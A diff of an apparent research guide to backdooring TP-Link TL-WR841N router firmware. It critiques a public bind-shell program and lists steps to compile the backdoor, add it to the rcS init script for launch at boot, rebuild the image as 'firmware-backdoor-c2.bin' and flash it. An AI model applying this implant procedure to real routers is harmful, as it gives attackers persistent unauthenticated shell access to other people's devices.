@@ -1,7 +1,6 @@
 # Backdooring the Firmware
 In this section, we examine the process of introducing a controlled backdoor mechanism into the firmware for research and 
-analysis purposes. The objective of this effort is practical deployment and firmware exploitation as well as
-workflows, toolchain preparation, and architectural behavior under altered system conditions.
+analysis purposes. For the firmware extraction, binary compile and firmware repacking we referred to [firmware-mod](./Firmware-mod.md).
 
 Our initial approach consisted of surveying existing public examples of backdoor-style programs, both to understand common 
 design patterns and to evaluate their suitability for adaptation. This exploratory phase led us to a minimal bind‑shell 
@@ -22,9 +21,17 @@ which provides a simple bind‑shell implementation targeting BusyBox‑based de
 constraints of our platform, making it a reasonable candidate for our goal.
 
 However, a closer inspection revealed several architectural shortcomings and unsafe practices that prevented the code
-from being integrated directly into the firmware. Instead, it functioned more as an illustrative baseline,
-highlighting the essential components of a minimalist backdoor while underscoring the need for a more robust and
-standards‑compliant re‑implementation tailored to our environment.
+from being integrated directly into the firmware:
+- **Inverted and non-standard fork logic**: The parent process handles the connection instead of the child, creating an inefficient and unconventional chain of processes.
+- **Lack of zombie process management**: Does not ignore SIGCHLD or use waitpid, potentially causing an accumulation of zombie processes.
+- **Lack of SO_REUSEADDR**: Prevents immediate restart on the same port after a crash or termination.
+- **Insufficient error handling**: Does not check the return values of critical functions like socket(), bind(), listen(), accept(), or fork().
+- **Limited listen backlog**: `listen(1)` allows only one connection in the queue, limiting scalability.
+- **Problematic banner and dup2 management**: Unnecessary global variable `i`, loop with suspicious `/*u*/` comment (possible typo), and close(clientfd) not executed if execve succeeds.
+- **Lack of explicit closures**: Does not close serverfd in the handler and uses sizeof(struct sockaddr) instead of sizeof(client).
+- **General security and robustness**: No protection against flooding, logging, or checks on the busybox path; vulnerable to DoS on limited hardware.
+
+Instead, it functioned more as an illustrative baseline, highlighting the essential components of a minimalist backdoor while underscoring the need for a more robust and standards‑compliant re‑implementation tailored to our environment.
 
 ```C
 #include <stdio.h>
@@ -167,37 +174,13 @@ constructs with more predictable and standards‑compliant system calls. From a 
 illustrates the importance of disciplined resource management and explicit failure handling when examining or instrumenting 
 embedded firmware components.
 
-## Preparing a Toolchain
-A crucial prerequisite for working with embedded firmware is the availability of a suitable cross‑compilation toolchain.
-Because the target platform in this case requires a MIPS32 Release2 little‑endian compiler, we began by investigating the 
-official TP‑LINK resources. The TP‑LINK GPL Source Center provides extensive source packages; however, they rely on legacy 
-build environments such as Ubuntu12.04, rendering them impractical for contemporary research workflows without substantial 
-system recreation.
+## Compile the backdoor
+It is therefore necessary to correctly compile backdoor_V2.c so that it can be properly executed once launched from within the TL-WR841N router. For setting up the toolchain, refer to the guide provided in the [Firmware-mod](Firmware-mod.md) file.
+The backdoor_V2.c file was then compiled by executing the following command:
 
-To overcome these limitations, we turned to an open‑source build framework:`buildroot`. This environment allowed us to 
-configure a custom toolchain tailored to our target architecture. The full configuration used in our research can be 
-inspected in the `buildroot/Makefile.mk` file within the project repository.
-
-For convenience, we prepared an `env.sh` script that sets the environment variables required to invoke the cross‑compiler. 
-The script can be loaded using:
-``` bash
-source env.sh
-```
-Researchers may need to adjust the `PATH` and `SYSROOT` variables according to their local filesystem layout.
-Once configured, compiling target‑architecture binaries becomes straightforward:
-``` bash
+```bash
 mipsel-linux-gcc -o backdoor backdoor_V2.c
 ```
-and the resulting artifact can be examined with:
-```bash
-file backdoor
-```
-to validate that the output corresponds to a MIPS32 Release2 executable.
-Integrating the compiled binary into the working filesystem involves placing it within the unpacked firmware tree at:
-``` 
-fmk/rootfs/bin/backdoor
-```
-using appropriate privileges.
 
 ## Modifying the Firmware Init System
 To ensure the binary is executed at boot time within the emulated or physical router, it must be referenced by the system’s 
@@ -209,32 +192,25 @@ sudo echo "/bin/backdoor &" >> fmk/etc/init.d/rcS
 This modification ensures that the program is launched automatically upon device startup.
 
 ## Rebuilding the Firmware
-Once the filesystem has been patched, reconstructing a flashable firmware image is a straightforward procedure. 
-From within the `FirmwareModUtils/firmware-mod-kit` directory, executing:
+The guide for the correct reconstruction of the firmware is provided in the [Firmware-mod](Firmware-mod.md) file.
+Once the backdoor executable has been added to /bin in the rootfs and the system initialization script rcS has been modified as explained in [Modifying the Firmware Init System](#modifying-the-firmware-init-system), the firmware can be rebuilt to obtain the final .bin file. To do so, the following command was executed:
+
 ```bash
-sudo ./build-firmware.sh -min
+./build-firmware.sh -f /home/carlo/Code/TL-WR841N_V14/firmware/TL-WR841Nv14_EU.bin \
+                    -r /home/carlo/Code/TL-WR841N_V14/FirmwareModUtils/fmk/rootfs \
+                    -o /home/carlo/Code/TL-WR841N_V14/firmware/firmware-backdoor-c2.bin
 ```
-The `-min` option is needed to allow FMK to build the firmware with a size that differs from the original.
-This generates a new `.bin` firmware image. This file should be deployed to the target device following the standard 
-vendor‑specific firmware flashing process, though in this case it is not as easy, please refer to the flashing paragraph
-of this guide.
 
-## Emulating in QEMU
-As discussed earlier, directly executing the original firmware within QEMU is non‑trivial due to hardware‑specific 
-dependencies and incomplete peripheral emulation. To streamline this step, we provide a helper script, `repackFirmware.py`,
-which performs additional automated adjustments to the unpacked filesystem. These adjustments improve compatibility with 
-QEMU by patching or substituting components not readily supported by the emulator.
+The `build-firmware.sh` script automatically creates two versions of the file:
+- `firmware.bin`
+- `firmware-stripped.bin`
+It is necessary to use the appropriate version depending on the firmware flashing method. Further details are provided in [Firmware-flashing](Firmware-flashing.md).
 
-The script can be used as follows:
-```
-sudo python repackFirmware.py <path to an unmodified firmware>
-```
-**Note:** By default, the tool detects and injects a “fake libnvram” implementation to emulate shared‑memory behaviour 
-expected by the firmware. If this library is unavailable, the script copies a fallback version from the FAT directory into
-the root filesystem. A `--no-rootfs-patch` option is provided for researchers who wish to disable automated rootfs modifications.
-You may also need to compile `nvramfaker` from [source](https://github.com/zcutlip/nvram-faker).
+The parameters used are:
+- `-f | --firmware`: original firmware
+- `-r | --rootfs`: modified rootfs directory
+- `-o | --output`: full path of the output file
 
-This workflow enables a reproducible and controlled environment for firmware analysis, facilitating experimentation 
-without requiring continuous flashing of physical hardware.
 
-Though this option is provided to researchers we preferred to work directly on the hardware.
+## Flash the new Firmware
+Once the `firmware.bin` and `firmware-stripped.bin` files have been obtained, the modified firmware must be flashed onto the router. The flashing procedure is described in detail in [Firmware-flashing](Firmware-flashing.md).
